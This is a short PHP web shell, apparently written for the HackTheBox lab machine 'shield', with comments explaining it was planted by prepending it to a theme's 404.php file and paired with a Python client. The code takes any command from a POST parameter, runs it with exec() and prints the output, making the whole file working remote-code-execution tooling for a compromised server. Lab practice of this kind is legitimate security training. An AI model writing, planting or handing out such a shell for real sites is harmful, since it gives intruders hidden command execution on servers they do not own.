<!-- ptermserver.php - pairs with ptermulator.py to achieve rudimentary remote code execution -->
<!-- Used on HackTheBox machine 'shield' by editing a theme's 404.php file to be preceded by this -->
<!-- David Garlak 24 June 2020 -->
<?php
    if(isset($_POST['cmd'])) {
	$cmd = $_POST['cmd'];
	$out = array();
	exec($cmd, $out);
    	print("<table><th>Output</th>");
    	foreach($out as $line) { print("<tr><td>".$line."</td></tr>"); }
    	print("</table>");
        $out = array();
        die();
    }
    else {
        print("<table><th>Output</th><tr><td>No command sent</td></tr></table>");
    	die();
    }
?>
